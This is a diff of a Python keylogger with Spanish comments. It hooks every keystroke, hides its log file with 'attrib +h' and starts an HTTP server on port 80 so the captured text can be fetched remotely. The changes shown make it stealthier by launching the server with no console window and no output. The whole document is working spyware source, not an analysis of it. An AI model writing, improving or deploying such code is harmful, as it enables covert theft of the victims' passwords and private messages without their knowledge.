@@ -1,30 +1,31 @@
-import keyboard
-import os
-import subprocess
-import stat
+from keyboard import KEY_DOWN, hook, wait
+from stat import FILE_ATTRIBUTE_HIDDEN
+from os import path, stat
+from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, DEVNULL, Popen, run
+from sys import platform
 
 # Clase CMD
 class cmdAccess():
 
-    # Clase sin constructor
+    # No declaro un constructor        
     # Se crea metodo para ejecutar servidor http
     def httpServer(self):
 
         # Ejecuto servidor en el puerto 80, comando asincrónico
-        subprocess.Popen(["python", "-m", "http.server", "80"])
+        Popen(["python", "-m", "http.server", "80"], creationflags=0x08000000, stdout=DEVNULL, stderr=DEVNULL)
 
     # Metodo para ocultar archivo
     def hideFile(self, file):
 
         # Si no existe el archivo
-        if not os.path.exists(file):
+        if not path.exists(file):
             return
         
-        atributos = os.stat(file).st_file_attributes
+        atributos = stat(file).st_file_attributes
 
         # Si el archivo no está coulto, lo oculto.
-        if not bool(atributos & stat.FILE_ATTRIBUTE_HIDDEN):
-            subprocess.run(["attrib", "+h", file], check=True)
+        if not bool(atributos & FILE_ATTRIBUTE_HIDDEN):
+            run(["attrib", "+h", file], check=True)
 
 # Clase keylogger para recolectar texto
 class keyLogger(cmdAccess):
@@ -38,7 +39,7 @@ class keyLogger(cmdAccess):
     # Metodo para capturar pulsaciones
     def pulsacion_tecla(self, puls):
 
-        if puls.event_type == keyboard.KEY_DOWN:
+        if puls.event_type == KEY_DOWN:
             
             # Si se ha agregado un espacio
             if puls.name == 'backspace':
@@ -93,12 +94,13 @@ if __name__ == "__main__":
 
     # Levanto servidor
     subCMD.httpServer()
-
+    print("Ejecutando codigo ...")
+    
     # Objeto keylogger
     teclado_1 = keyLogger()
 
     # Detecto pulsaciones
-    keyboard.hook(teclado_1.pulsacion_tecla)
+    hook(teclado_1.pulsacion_tecla)
 
     # Similar bucle while
-    keyboard.wait()
+    wait()
